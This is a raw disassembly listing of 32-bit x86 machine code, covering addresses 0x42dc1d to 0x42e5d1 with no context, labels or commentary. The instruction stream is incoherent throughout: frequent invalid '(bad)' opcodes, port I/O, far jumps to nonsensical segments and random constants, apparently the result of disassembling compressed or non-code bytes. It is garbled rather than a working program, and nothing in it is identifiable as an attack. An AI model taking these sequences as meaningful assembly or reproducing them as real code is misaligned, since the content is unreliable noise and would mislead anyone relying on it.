  42dc1d:	add    BYTE PTR [edi],ch
  42dc1f:	imul   esp
  42dc21:	mov    gs,WORD PTR [ecx-0x5e70e4e4]
  42dc27:	adc    al,0x12
  42dc29:	(bad)
  42dc2d:	clc    
  42dc2e:	sbb    edx,DWORD PTR [edi]
  42dc30:	sub    DWORD PTR [ebp*2+0x348904c7],eax
  42dc37:	imul   DWORD PTR [eax+0x88]
	...
  42dc51:	add    BYTE PTR [eax],al
  42dc53:	out    0xf9,al
  42dc55:	mov    cl,0x9b
  42dc57:	xor    eax,0x7803e9ad
  42dc5c:	inc    ebp
  42dc5d:	mov    ebp,0xf6377335
  42dc62:	stos   BYTE PTR es:[edi],al
  42dc63:	jns    0x42dcdc
  42dc65:	mov    ebp,0xd8e2033d
  42dc6a:	adc    ch,BYTE PTR ds:0x6daeed8c
  42dc70:	retf   0xcac8
  42dc73:	mov    ch,0xf3
  42dc75:	in     eax,0x7c
  42dc77:	and    DWORD PTR ds:0xfa9f037f,esp
  42dc7d:	enter  0x208e,0x60
  42dc81:	in     eax,0x8e
  42dc83:	or     DWORD PTR ds:0x80889201,ecx
  42dc89:	jmp    0xa717:0x8f9db41
  42dc90:	ins    BYTE PTR es:[edi],dx
  42dc91:	push   es
  42dc92:	sub    DWORD PTR [eax+eax*4+0x5c],0x9d1a6eee
  42dc9a:	mul    DWORD PTR [ebx]
  42dc9c:	add    eax,0x5171704
  42dca1:	jmp    0xafc1bc
  42dca6:	mov    edx,0x650004d1
  42dcab:	cmp    cl,bh
  42dcad:	pop    es
  42dcae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dcaf:	jecxz  0x42dcbd
  42dcb1:	call   0xfbbf6057
  42dcb6:	bound  eax,QWORD PTR [eax]
	...
  42dcd0:	mov    bl,0x20
  42dcd2:	pop    ebx
  42dcd3:	das    
  42dcd4:	int    0xe1
  42dcd6:	mov    ebp,0x51d9f7e5
  42dcdb:	push   ss
  42dcdc:	cmp    ecx,0x1a78d923
  42dce2:	loopne 0x42dcbf
  42dce4:	mov    bh,0x4
  42dce6:	xchg   DWORD PTR [ecx-0x55],esp
  42dce9:	ins    BYTE PTR es:[edi],dx
  42dcea:	(bad)  
  42dceb:	call   0xd84014e7
  42dcf0:	lds    edi,FWORD PTR [ebp+0x53537c0]
  42dcf6:	push   edx
  42dcf7:	inc    esi
  42dcf8:	jecxz  0x42dd11
  42dcfa:	push   cs
  42dcfb:	test   eax,0x7d357bf7
  42dd00:	cmp    BYTE PTR [edi],0x0
  42dd03:	inc    ecx
  42dd04:	repnz inc ecx
  42dd06:	add    cl,ch
  42dd08:	je     0x42dd33
  42dd0a:	mov    ah,0x37
  42dd0c:	xor    eax,0xb7da0005
  42dd11:	shl    BYTE PTR [ecx+0x4a],cl
  42dd14:	inc    esp
  42dd15:	push   ebx
  42dd16:	aas    
  42dd17:	jmp    0xdb5ef684
  42dd1c:	aaa    
  42dd1d:	add    eax,0x4f04fe9
  42dd22:	add    BYTE PTR [edx+0x2ad244df],bl
  42dd28:	lock jnp 0x42dd40
  42dd2b:	add    DWORD PTR [esi+0x3f],esp
  42dd2e:	add    dh,ah
  42dd30:	shl    BYTE PTR [ecx],0xbc
  42dd33:	mov    bh,0x0
	...
  42dd4d:	mov    ah,0x4
  42dd4f:	(bad)  
  42dd50:	call   DWORD PTR [edx+0x1ed6b3d1]
  42dd56:	or     DWORD PTR [ebx],esi
  42dd58:	fisttp QWORD PTR [ebx]
  42dd5a:	ds mov ecx,0x35ad0
  42dd60:	call   0x3e3279
  42dd65:	cdq    
  42dd66:	inc    ebx
  42dd67:	je     0x42ddd7
  42dd69:	adc    bl,al
  42dd6b:	or     al,0xbc
  42dd6d:	imul   eax,esp,0xffffffff
  42dd70:	mov    cl,BYTE PTR [eax+0x5c]
  42dd73:	mov    esi,0x13fe452b
  42dd78:	add    BYTE PTR [edi+edx*8+0x350d43cd],bh
  42dd7f:	lea    ecx,[eax*2-0x5117afce]
  42dd86:	dec    edi
  42dd87:	sti    
  42dd88:	(bad)  
  42dd89:	fidiv  WORD PTR [edi-0x51]
  42dd8c:	(bad)  
  42dd8d:	mov    es,WORD PTR [edx]
  42dd8f:	lea    eax,[edx+esi*8]
  42dd92:	cmp    bh,dh
  42dd94:	je     0x42dd8f
  42dd96:	jo     0x42dde5
  42dd98:	call   0x3e2d5f
  42dd9d:	mov    ebx,0xfbbc2cfb
  42dda2:	(bad)  
  42dda3:	(bad)  
  42dda4:	jmp    0x51f5:0x1b0bffcc
  42ddab:	aaa    
  42ddac:	add    BYTE PTR [ebp+0x74c086],cl
	...
  42ddca:	test   al,0xfd
  42ddcc:	or     al,0xb4
  42ddce:	jmp    0x42dd94
  42ddd0:	dec    DWORD PTR [ecx+ebx*4-0x35f0b4af]
  42ddd7:	push   es
  42ddd8:	mov    esp,0xf708ced6
  42dddd:	je     0x42ddd8
  42dddf:	jo     0x42dd6d
  42dde1:	add    al,0xf4
  42dde3:	sub    al,0x34
  42dde5:	call   0x46eeda
  42ddea:	shl    ah,cl
  42ddec:	call   0x46e08ac
  42ddf1:	push   0x439e34
  42ddf6:	inc    ebx
  42ddf7:	pop    ecx
  42ddf8:	jecxz  0x42de07
  42ddfa:	mov    ah,0x6b
  42ddfc:	sub    bl,BYTE PTR [ebx-0x2e]
  42ddff:	inc    eax
  42de00:	ret    0xf404
  42de03:	cmp    eax,0x2b4ac046
  42de08:	add    al,0x52
  42de0a:	sbb    esp,DWORD PTR [ecx-0x19]
  42de0d:	or     eax,0x141d6bb4
  42de12:	lods   al,BYTE PTR ds:[esi]
  42de13:	not    al
  42de15:	scas   eax,DWORD PTR es:[edi]
  42de16:	sub    ch,BYTE PTR [ebx]
  42de18:	add    al,0x62
  42de1a:	push   edi
  42de1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42de1c:	scas   al,BYTE PTR es:[edi]
  42de1d:	aas    
  42de1e:	hlt    
  42de1f:	shr    DWORD PTR [ebp+0x3c],cl
  42de22:	hlt    
  42de23:	imul   edx,edx,0xffffffbf
  42de26:	sbb    eax,0x6007dba8
  42de2b:	jns    0x42ddb3
  42de2d:	je     0x42de2f
	...
  42de47:	sbb    BYTE PTR [edi+ebp*1+0x7f],dh
  42de4b:	mov    esp,0x16959c36
  42de50:	ins    BYTE PTR es:[edi],dx
  42de51:	call   DWORD PTR [ecx-0x69]
  42de54:	fld    TBYTE PTR [ebp-0xee10bc1]
  42de5a:	sbb    eax,DWORD PTR [esi]
  42de5c:	lods   al,BYTE PTR ds:[esi]
  42de5d:	call   FWORD PTR [ecx-0x4a]
  42de60:	call   DWORD PTR [si+0x6f]
  42de64:	pop    ss
  42de65:	and    esp,0xffffff8c
  42de68:	in     al,dx
  42de69:	xchg   edi,eax
  42de6a:	je     0x42de63
  42de6c:	imul   edi,edi,0x4e
  42de6f:	sub    dl,BYTE PTR [edi+0x4ec7d7a]
  42de75:	ins    BYTE PTR es:[edi],dx
  42de76:	mov    bh,bh
  42de78:	mov    BYTE PTR [edx],bl
  42de7a:	add    eax,0x85c104f4
  42de7f:	xchg   esi,eax
  42de80:	add    al,0xe9
  42de82:	jg     0x42deb8
  42de84:	or     eax,0x4f4d56d
  42de89:	jmp    0xf44b960c
  42de8e:	add    al,0x42
  42de90:	jge    0x42de7b
  42de92:	cli    
  42de93:	jo     0x42de46
  42de95:	jmp    0xa92fd29d
  42de9a:	mov    cl,0xeb
  42de9c:	add    al,0x92
  42de9e:	lock or edx,DWORD PTR [ebx]
  42dea1:	sub    DWORD PTR [esi+edx*4],eax
  42dea4:	add    esp,0xe8c1264b
  42deaa:	add    eax,DWORD PTR [eax]
	...
  42dec4:	inc    DWORD PTR [esi+0x4f40364]
  42deca:	xor    DWORD PTR [edx+0x21e903ff],ecx
  42ded0:	cmc    
  42ded1:	add    DWORD PTR [ecx+0x64052bb1],esp
  42ded7:	nop/reserved BYTE PTR [ecx]
  42deda:	xchg   ecx,eax
  42dedb:	ins    DWORD PTR es:[edi],dx
  42dedc:	hlt    
  42dedd:	add    al,0xe9
  42dedf:	fwait
  42dee0:	daa    
  42dee1:	inc    edi
  42dee2:	cmp    cl,BYTE PTR [edx-0x6466bc8d]
  42dee8:	jnp    0x42dee0
  42deea:	call   0xcd044bf2
  42deef:	idiv   DWORD PTR [eax+0x45]
  42def2:	xchg   ebp,eax
  42def3:	es jns 0x42dee7
  42def6:	int3   
  42def7:	(bad)  
  42def8:	imul   ebx,DWORD PTR [ebp+0x6cf403e9],0xffffffc0
  42deff:	lds    ecx,FWORD PTR [edi-0x2ff09384]
  42df05:	adc    al,0x0
  42df07:	xor    DWORD PTR [eax],edx
  42df09:	add    eax,0x245fe900
  42df0e:	mov    esi,0xb0a67de6
  42df13:	mov    bh,0xb1
  42df15:	add    al,0x85
  42df17:	test   eax,0xd9867b04
  42df1c:	ins    DWORD PTR es:[edi],dx
  42df1d:	adc    bl,BYTE PTR [eax]
  42df1f:	fidiv  DWORD PTR [edi+0x3bbe5004]
  42df25:	cwde   
  42df26:	fisubr WORD PTR [edx]
	...
  42df40:	add    al,bh
  42df42:	mov    DWORD PTR [ebp+eax*1-0x4c],eax
  42df46:	(bad)  
  42df47:	dec    edi
  42df48:	(bad)  
  42df49:	hlt    
  42df4a:	add    eax,0xb8a2e900
  42df4f:	and    al,0x61
  42df51:	test   DWORD PTR [eax+eax*1],0x238381
  42df58:	jmp    0xdd66cfed
  42df5d:	jo     0x42dfa0
  42df5f:	adc    BYTE PTR [edx+0x35],ah
  42df62:	aad    0xe7
  42df64:	mov    bl,0xaa
  42df66:	add    al,0x0
  42df68:	jb     0x42df60
  42df6a:	(bad)  
  42df6b:	cli    
  42df6c:	mov    ecx,0xe17d82ef
  42df71:	inc    DWORD PTR [edx+edx*8-0x56]
  42df75:	idiv   DWORD PTR [edi+0x15]
  42df78:	in     eax,0xc9
  42df7a:	cmp    eax,DWORD PTR [eax]
  42df7c:	push   edx
  42df7d:	out    0x39,eax
  42df7f:	add    al,ch
  42df81:	test   DWORD PTR [esi*2+0x7ff70c3],0x8ce10402
  42df8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42df8d:	retf   
  42df8e:	repz dec edi
  42df90:	push   ss
  42df91:	xchg   ebx,eax
  42df92:	pop    es
  42df93:	adc    al,0xa9
  42df95:	test   DWORD PTR [ecx+0x2b1100c0],0x7e670062
  42df9f:	mov    WORD PTR [ecx+esi*4+0x6f],es
  42dfa3:	dec    ebx
  42dfa4:	lea    eax,[eax]
	...
  42dfbe:	adc    DWORD PTR [ebp+0x7f],esp
  42dfc1:	add    BYTE PTR [ebp+0x7],bl
  42dfc4:	push   eax
  42dfc5:	jp     0x4a67e58f
  42dfcb:	pop    es
  42dfcc:	add    BYTE PTR [eax],al
  42dfce:	sbb    eax,0x3a086f8e
  42dfd3:	push   0x2f
  42dfd5:	adc    al,0x1d
  42dfd7:	add    DWORD PTR [ebp+0x7a540bc0],eax
  42dfdd:	clc    
  42dfde:	dec    esp
  42dfdf:	or     cl,BYTE PTR ds:0x378da83
  42dfe5:	jne    0x42e00b
  42dfe7:	pop    ds
  42dfe8:	add    BYTE PTR [ebx+0x16e300cd],cl
  42dfee:	jmp    0xb64:0xf9836178
  42dff5:	and    BYTE PTR [edi],cl
  42dff7:	jbe    0x42e023
  42dff9:	leave  
  42dffa:	repz dec DWORD PTR [ebx+0x44]
  42dffe:	sbb    eax,0xed2443f2
  42e003:	ss call 0xf7d02874
  42e009:	push   edi
  42e00a:	dec    edx
  42e00b:	imul   ebp,DWORD PTR [ebx+0x57068d14],0x5e
  42e012:	xchg   esi,eax
  42e013:	stc    
  42e014:	in     al,0x5d
  42e016:	pop    ds
  42e017:	jp     0x42e014
  42e019:	push   esp
  42e01a:	push   esi
  42e01b:	xchg   edx,eax
  42e01c:	dec    esi
  42e01d:	mov    eax,DWORD PTR [eax+0x564e7e]
	...
  42e03b:	fisubr DWORD PTR [edx-0x71]
  42e03e:	adc    al,0x5d
  42e040:	push   es
  42e041:	cmp    eax,0xfffffff4
  42e044:	in     al,0x1
  42e046:	or     BYTE PTR [ebx+ebp*2-0x180bffa6],cl
  42e04d:	mov    esi,0xbff6f375
  42e052:	jmp    0x424cc8
  42e057:	jno    0x42e0c4
  42e059:	repz xor DWORD PTR [esi+0x6c],0xffffffff
  42e05e:	push   DWORD PTR [edi+0x5a]
  42e061:	add    eax,0x81eeee74
  42e066:	or     eax,0xfa7e60e0
  42e06b:	sti    
  42e06c:	cmp    BYTE PTR [edi],cl
  42e06e:	dec    edi
  42e06f:	mov    ds:0xe56ff1ba,eax
  42e074:	sub    eax,DWORD PTR [edi+eax*4]
  42e077:	sbb    al,0xe1
  42e079:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e07a:	je     0x42e014
  42e07c:	idiv   BYTE PTR [ecx+0x7e78a048]
  42e082:	call   0x7f3ff881
  42e087:	or     al,0x62
  42e089:	adc    BYTE PTR [eax],bl
  42e08b:	jg     0x42e014
  42e08d:	xchg   edi,eax
  42e08e:	adc    esp,DWORD PTR [edi+0x2c7f0515]
  42e094:	repz fwait
  42e096:	mov    ch,0xd4
  42e098:	imul   edi,edi,0xffffff86
  42e09b:	in     al,dx
  42e09c:	(bad)  
  42e09d:	sti    
  42e09e:	dec    esi
	...
  42e0b7:	add    BYTE PTR [esi+0x6c],bl
  42e0ba:	xchg   esi,eax
  42e0bb:	jmp    0x42e12c
  42e0bd:	push   eax
  42e0be:	test   DWORD PTR [ebx+ebx*8-0x4b4627b1],0x22003f19
  42e0c9:	cmp    esi,ecx
  42e0cb:	pop    ss
  42e0cc:	out    0xab,al
  42e0ce:	jmp    DWORD PTR [edi+0x70]
  42e0d1:	xlat   BYTE PTR ds:[ebx]
  42e0d2:	inc    ebx
  42e0d3:	add    BYTE PTR [esp+eax*1+0x79af8833],bl
  42e0da:	mov    dl,0x9b
  42e0dc:	lods   al,BYTE PTR ds:[esi]
  42e0dd:	js     0x42e0f1
  42e0df:	xchg   DWORD PTR [esi+0x7a],eax
  42e0e2:	hlt    
  42e0e3:	out    0x1,eax
  42e0e5:	(bad)
  42e0e8:	xor    al,0xe2
  42e0eb:	cs mov eax,fs
  42e0ee:	scas   al,BYTE PTR es:[edi]
  42e0ef:	add    esi,esp
  42e0f1:	jns    0x42e167
  42e0f3:	sti    
  42e0f4:	outs   dx,BYTE PTR ds:[esi]
  42e0f5:	minps  xmm6,xmm5
  42e0f8:	sub    eax,DWORD PTR ds:0xcb97b3e
  42e0fe:	xor    ah,BYTE PTR [esi]
  42e100:	mov    ecx,0xa703e546
  42e105:	(bad)  
  42e106:	shl    DWORD PTR [edi+eiz*4],0x6c
  42e10a:	js     0x42e110
  42e10c:	hlt    
  42e10d:	add    al,0x6c
  42e10f:	ret    
  42e110:	mov    esp,0xa9b163f3
  42e115:	call   FWORD PTR [esi-0x2a]
  42e118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e119:	(bad)  
  42e11a:	call   0x42e1f1
	...
  42e133:	add    BYTE PTR [eax],al
  42e135:	arpl   bp,dx
  42e137:	imul   edi,DWORD PTR [ecx+eiz*4-0x77fe2eee],0xffffffd6
  42e13f:	imul   eax,DWORD PTR [esi+0x2e410181],0xfffffff4
  42e146:	add    DWORD PTR [ecx-0x66],ebp
  42e149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e14a:	mov    esp,0x84f703ef
  42e14f:	dec    esi
  42e150:	inc    ebx
  42e151:	inc    esi
  42e152:	js     0x42e129
  42e154:	fild   WORD PTR [edi]
  42e156:	mov    bl,al
  42e158:	xchg   BYTE PTR [edx],ch
  42e15a:	iret   
  42e15b:	mov    cl,0xd2
  42e15d:	stos   BYTE PTR es:[edi],al
  42e15e:	js     0x42e13c
  42e160:	or     esp,esi
  42e162:	(bad)  
  42e163:	call   0x5899ea
  42e168:	jo     0x42e157
  42e16a:	add    al,0x3
  42e16c:	imul   esi,DWORD PTR [ebp+eax*2+0x78],0x7346bef6
  42e174:	repnz add al,0x2
  42e177:	mov    ch,dh
  42e179:	mov    cl,0x5f
  42e17b:	or     DWORD PTR [edx+0x67],esp
  42e17e:	pusha  
  42e17f:	add    eax,0x873e9371
  42e184:	and    dh,dh
  42e186:	jp     0x42e10f
  42e188:	sub    dl,cl
  42e18a:	adc    edi,0xd92f7370
  42e190:	pop    esp
  42e191:	outs   dx,BYTE PTR ds:[esi]
  42e192:	jg     0x42e1e0
  42e194:	add    eax,0x5dc9815c
	...
  42e1b1:	add    dh,dh
  42e1b3:	lea    edi,[ecx]
  42e1b5:	xor    bl,BYTE PTR [ecx]
  42e1b7:	mov    bh,0x8
  42e1b9:	jmp    0xc1c9b5c2
  42e1be:	pop    es
  42e1bf:	aam    0xe7
  42e1c1:	add    al,0xf7
  42e1c3:	add    al,0x0
  42e1c5:	cli    
  42e1c6:	pop    esp
  42e1c7:	xor    BYTE PTR [edi-0x30cffcdb],bh
  42e1cd:	adc    al,0x23
  42e1cf:	mov    dl,0x58
  42e1d1:	sbb    eax,0xa92f04b0
  42e1d6:	cmp    eax,0xe9de753f
  42e1db:	cmp    eax,0x2fc8f516
  42e1e0:	idiv   esp
  42e1e2:	clc    
  42e1e3:	scas   eax,DWORD PTR es:[edi]
  42e1e4:	push   ebx
  42e1e5:	jmp    0xb829d9da
  42e1ea:	aas    
  42e1eb:	out    dx,eax
  42e1ec:	jmp    ebp
  42e1ee:	ja     0x42e24f
  42e1f0:	cmp    eax,0x23f070bf
  42e1f5:	cmc    
  42e1f6:	dec    edx
  42e1f7:	idiv   dl
  42e1f9:	add    BYTE PTR [edi+0x29],ch
  42e1fc:	dec    edi
  42e1fd:	jmp    FWORD PTR [eax-0x32bff1f9]
  42e203:	test   ah,al
  42e205:	adc    BYTE PTR [ebx+ecx*1],ah
  42e208:	add    BYTE PTR [edi],al
  42e20a:	sbb    eax,0xa778bff8
  42e20f:	dec    esp
  42e210:	shl    DWORD PTR [edi-0x75],0x7
  42e214:	dec    BYTE PTR [edx+0x0]
	...
  42e22e:	add    ch,ch
  42e230:	popf   
  42e231:	or     BYTE PTR [ebx+0x66bb55d4],cl
  42e237:	add    al,0x5
  42e239:	outs   dx,DWORD PTR ds:[esi]
  42e23a:	lea    eax,[ecx+0x8]
  42e23d:	add    ebx,0xffffff83
  42e240:	not    dl
  42e242:	jns    0x42e29d
  42e244:	dec    esp
  42e245:	fdiv   DWORD PTR [ebp+0x67]
  42e248:	cld    
  42e249:	dec    ebx
  42e24a:	and    al,0x51
  42e24c:	test   al,0x74
  42e24f:	pop    edi
  42e250:	cli    
  42e251:	cmp    BYTE PTR [edi+0x16],bl
  42e254:	inc    ebx
  42e255:	or     BYTE PTR [eax],al
  42e257:	fdivr  DWORD PTR [edx-0x7f3acd8c]
  42e25d:	idiv   edi
  42e25f:	loop   0x42e28a
  42e261:	adc    eax,0x4e
  42e264:	add    BYTE PTR [eax+0x4070d39],0x41
  42e26b:	xlat   BYTE PTR ds:[ebx]
  42e26c:	pop    es
  42e26d:	out    dx,eax
  42e26e:	test   DWORD PTR [edi+0x6],ecx
  42e271:	add    eax,0xff00eabf
  42e276:	jg     0x42e210
  42e278:	mov    DWORD PTR [ebp+ecx*1-0x78],esi
  42e27c:	cmp    BYTE PTR [eax+0x6],0xb6
  42e280:	inc    esp
  42e281:	mov    DWORD PTR [esi],eax
  42e283:	inc    esi
  42e284:	add    eax,0xfdcd267b
  42e289:	mov    esi,0xf9c2f45f
  42e28e:	mov    bh,0x2b
  42e290:	ins    BYTE PTR es:[edi],dx
  42e291:	cld    
  42e292:	jg     0x42e294
	...
  42e2ac:	jno    0x42e2da
  42e2ae:	push   es
  42e2af:	add    edi,DWORD PTR [ecx+0x2e]
  42e2b2:	or     edi,edi
  42e2b4:	jbe    0x42e2bc
  42e2b6:	add    al,0xbf
  42e2b8:	jns    0x42e2df
  42e2ba:	or     esi,DWORD PTR [esp+ebp*2]
  42e2bd:	pop    ds
  42e2be:	test   bl,bh
  42e2c0:	and    ebp,DWORD PTR [edi+0xee7d078]
  42e2c6:	sbb    eax,0xfd8fcd39
  42e2cb:	jle    0x42e282
  42e2cd:	push   0x39
  42e2cf:	jne    0x42e25a
  42e2d1:	loope  0x42e283
  42e2d3:	jne    0x42e2c6
  42e2d5:	cs sub al,0x0
  42e2d8:	sti    
  42e2d9:	jmp    0x42e354
  42e2db:	repnz loopne 0x42e34e
  42e2de:	mov    bl,bh
  42e2e0:	fcomp  QWORD PTR [ebp+0x2a]
  42e2e3:	mov    esi,0xff6a666d
  42e2e8:	jbe    0x42e2e8
  42e2ea:	add    eax,DWORD PTR [edi+0x56b1f33]
  42e2f0:	jl     0x42e301
  42e2f2:	add    al,0x3
  42e2f4:	je     0x42e2df
  42e2f6:	inc    ebx
  42e2f7:	jns    0x42e2f4
  42e2f9:	loopne 0x42e370
  42e2fb:	je     0x42e2f4
  42e2fd:	jmp    0x373f:0x5b370025
  42e304:	sub    al,0x18
  42e306:	push   cs
  42e307:	or     ebp,0x8bfb7f86
  42e30d:	jns    0x42e318
  42e30f:	mov    eax,0x0
	...
  42e328:	add    BYTE PTR [ebx+0x3780066b],ch
  42e32e:	mov    ch,0x5
  42e330:	jne    0x42e332
  42e332:	lahf   
  42e333:	add    bl,BYTE PTR [eax+0x60]
  42e336:	add    eax,0x4d2b03a9
  42e33b:	aad    0x5
  42e33d:	ins    DWORD PTR es:[edi],dx
  42e33e:	add    esp,DWORD PTR [esi]
  42e340:	aaa    
  42e341:	mov    ah,0x3b
  42e343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e344:	daa    
  42e345:	lock out dx,eax
  42e347:	jmp    0xf1f8:0xf121383c
  42e34e:	xor    DWORD PTR [ebp+0x2a75fc27],0xffffff83
  42e355:	das    
  42e356:	out    dx,eax
  42e357:	jmp    0x42e314
  42e359:	inc    edi
  42e35a:	add    eax,0xc5a83e2
  42e35f:	jmp    0x7f11093a
  42e364:	xor    eax,0x43b67273
  42e369:	rcr    DWORD PTR [ecx-0x66],cl
  42e36c:	test   DWORD PTR cs:[edi+0x756f505a],eax
  42e373:	push   0xffffff88
  42e375:	cmp    dh,al
  42e377:	repnz lea ecx,[eax]
  42e37a:	pop    es
  42e37b:	gs push ebp
  42e37d:	loopne 0x42e37c
  42e37f:	pusha  
  42e380:	adc    al,0xb5
  42e382:	rcr    DWORD PTR [ecx],0xf9
  42e385:	push   ebx
  42e386:	jg     0x42e34a
  42e388:	clc    
  42e389:	test   bl,0x2d
  42e38c:	mov    esp,0x0
	...
  42e3a5:	add    dl,al
  42e3a7:	add    al,0xea
  42e3a9:	xor    DWORD PTR [esi],0x3
  42e3ac:	jmp    0xf9639c3f
  42e3b1:	mov    BYTE PTR ds:0xfd8ce6f0,ch
  42e3b7:	aad    0x32
  42e3b9:	fist   WORD PTR [ecx+0x0]
  42e3bc:	jmp    0x18ab5699
  42e3c1:	xchg   DWORD PTR [ecx-0x5a291688],ebx
  42e3c7:	mov    DWORD PTR [eax],eax
  42e3c9:	jnp    0x42e3f5
  42e3cb:	pop    esp
  42e3cc:	test   DWORD PTR [edi-0x1d],esi
  42e3cf:	adc    edx,DWORD PTR [ebx+0x72]
  42e3d2:	hlt    
  42e3d3:	add    BYTE PTR [edi],ah
  42e3d5:	pusha  
  42e3d6:	ins    BYTE PTR es:[edi],dx
  42e3d7:	inc    ebp
  42e3d8:	je     0x42e3d7
  42e3da:	out    0xb7,al
  42e3dc:	adc    al,0xde
  42e3de:	fisttp QWORD PTR [ecx-0x190d4232]
  42e3e4:	mov    al,bl
  42e3e6:	jb     0x42e42e
  42e3e8:	(bad)  
  42e3e9:	mov    al,ds:0x4174beba
  42e3ee:	xchg   esi,eax
  42e3ef:	mov    edx,esi
  42e3f1:	pushf  
  42e3f2:	bnd repz call 0x458a8ee4
  42e3f9:	adc    eax,0x69027491
  42e3fe:	ret    0x6244
  42e401:	jo     0x42e3fb
  42e403:	mov    eax,DWORD PTR [ebp-0xf]
  42e406:	ins    BYTE PTR es:[edi],dx
  42e407:	inc    ebp
  42e408:	je     0x42e3f5
	...
  42e422:	add    BYTE PTR [eax-0x145b78f3],al
  42e428:	into   
  42e429:	push   esi
  42e42a:	mov    al,0xba
  42e42c:	cld    
  42e42d:	push   DWORD PTR [ebx]
  42e42f:	imul   esp,DWORD PTR [ecx+0x51],0x3f9bf6c
  42e436:	sbb    dh,BYTE PTR [eax+0x731fbf3d]
  42e43c:	cli    
  42e43d:	sti    
  42e43e:	shl    DWORD PTR [edx+0x16b6fb6e],1
  42e444:	mov    eax,eax
  42e446:	xor    eax,0xa6c7f3f3
  42e44b:	scas   eax,DWORD PTR es:[edi]
  42e44c:	mov    bl,0x87
  42e44e:	and    al,0x74
  42e450:	ds mov edi,0x5161813c
  42e456:	fs mov edi,0x3e0003f9
  42e45c:	enter  0xc3c8,0xe3
  42e460:	xor    DWORD PTR [ebp-0x4],0x75
  42e464:	dec    ebp
  42e465:	stc    
  42e466:	call   FWORD PTR [edx+0x67]
  42e469:	test   al,al
  42e46b:	ror    DWORD PTR [edx],0x7b
  42e46e:	enter  0xc03a,0xba
  42e472:	mov    esp,DWORD PTR [eax-0x7f3c370d]
  42e478:	sub    ah,0xff
  42e47b:	cmp    bh,0x50
  42e47e:	call   0x3a6b7f
  42e483:	and    cl,cl
  42e485:	ja     0x42e4bd
	...
  42e49f:	add    BYTE PTR [eax],dl
  42e4a1:	(bad)  [ebp+eax*1+0x17]
  42e4a5:	push   ecx
  42e4a6:	outs   dx,DWORD PTR ds:[esi]
  42e4a7:	inc    eax
  42e4a8:	lea    edi,[eax]
  42e4aa:	sar    BYTE PTR [ecx],0x60
  42e4ad:	push   DWORD PTR [esp+edx*1+0x73]
  42e4b1:	cs cli 
  42e4b3:	jae    0x42e461
  42e4b5:	in     al,dx
  42e4b6:	fcomp  DWORD PTR [ebx]
  42e4b8:	les    ecx,FWORD PTR [ecx-0x7827dc1f]
  42e4be:	dec    edi
  42e4bf:	add    BYTE PTR [edx-0x79],dl
  42e4c2:	jecxz  0x42e4d6
  42e4c4:	pop    ds
  42e4c5:	adc    BYTE PTR [ebp+0x8],0xc8
  42e4c9:	dec    edx
  42e4ca:	add    edx,DWORD PTR [eax+0x65]
  42e4cd:	test   edi,esi
  42e4cf:	(bad)  
  42e4d0:	mov    edx,0x3aff12e0
  42e4d5:	test   BYTE PTR [ebp-0x3e],bl
  42e4d8:	push   ecx
  42e4d9:	pop    es
  42e4da:	push   ebp
  42e4db:	mov    edi,DWORD PTR [ecx]
  42e4dd:	push   esi
  42e4de:	push   ecx
  42e4df:	mov    eax,edx
  42e4e1:	test   BYTE PTR [ebx-0x7db3dabb],al
  42e4e7:	icebp  
  42e4e8:	jecxz  0x42e569
  42e4ea:	inc    ebp
  42e4eb:	or     ah,dh
  42e4ed:	test   DWORD PTR [ebx-0x7d7df406],ebx
  42e4f3:	sar    BYTE PTR [eax+edi*1-0x75],0x4d
  42e4f8:	clc    
  42e4f9:	(bad)  
  42e4fb:	pop    es
  42e4fc:	fadd   QWORD PTR [esi+edi*2]
  42e4ff:	sti    
  42e500:	jmp    0x42e4eb
  42e502:	ds js  0x42e505
	...
  42e51d:	sub    ecx,esp
  42e51f:	jg     0x42e596
  42e521:	clc    
  42e522:	and    al,0xfb
  42e524:	sti    
  42e525:	dec    eax
  42e526:	adc    DWORD PTR [ebp+0x3649fc4d],ecx
  42e52c:	cmp    DWORD PTR [eax+0x19],ecx
  42e52f:	jns    0x42e50b
  42e531:	fistp  QWORD PTR [ecx]
  42e533:	test   dl,ah
  42e535:	xlat   BYTE PTR ds:[ebx]
  42e536:	call   0x6b3738c3
  42e53b:	jg     0x42e524
  42e53d:	add    ch,BYTE PTR [ebx]
  42e53f:	repnz pop es
  42e541:	imul   ebp,DWORD PTR [ecx-0x5e80aff9],0xe7a3877b
  42e54b:	push   eax
  42e54c:	call   0xfbc2ef8f
  42e551:	(bad)  
  42e552:	jne    0x42e4d6
  42e554:	sti    
  42e555:	call   0xd30c19ba
  42e55a:	in     al,0x10
  42e55c:	pop    edx
  42e55d:	sub    eax,0x6f00089e
  42e562:	cmp    BYTE PTR [eax],ch
  42e564:	or     al,0x81
  42e566:	and    BYTE PTR [eax],ch
  42e568:	adc    BYTE PTR [edx+eax*2-0x90fdc08],ah
  42e56f:	(bad)  
  42e570:	and    ebp,eax
  42e572:	push   ebx
  42e573:	jl     0x42e571
  42e575:	xor    edi,DWORD PTR [ebx+0x7c0873f]
  42e57b:	adc    BYTE PTR [ebp+0x13cd04b8],cl
	...
  42e599:	add    ah,al
  42e59b:	jno    0x42e5b2
  42e59d:	sub    BYTE PTR [eax],al
  42e59f:	jle    0x42e5ce
  42e5a1:	sub    al,bh
  42e5a3:	pop    esp
  42e5a4:	sub    eax,DWORD PTR [eax-0x26598e01]
  42e5aa:	jb     0x42e60d
  42e5ac:	sbb    ch,dl
  42e5ae:	jb     0x42e5a0
  42e5b0:	loopne 0x42e5b5
  42e5b2:	popa   
  42e5b3:	or     dh,BYTE PTR [ecx]
  42e5b5:	xlat   BYTE PTR ds:[ebx]
  42e5b6:	jecxz  0x42e5c2
  42e5b8:	imul   ebp,DWORD PTR [ebx+0x4b],0x4313ac7e
  42e5bf:	pop    ebp
  42e5c0:	xchg   ecx,eax
  42e5c1:	jle    0x42e592
  42e5c3:	jno    0x42e623
  42e5c5:	pop    esp
  42e5c6:	jns    0x42e615
  42e5c8:	rol    BYTE PTR [esi],0x7c
  42e5cb:	fld1   
  42e5cd:	push   es
  42e5ce:	je     0x42e62d
  42e5d0:	xchg   ebp,eax
  42e5d1:	adc    BYTE PTR [ecx],0x6d
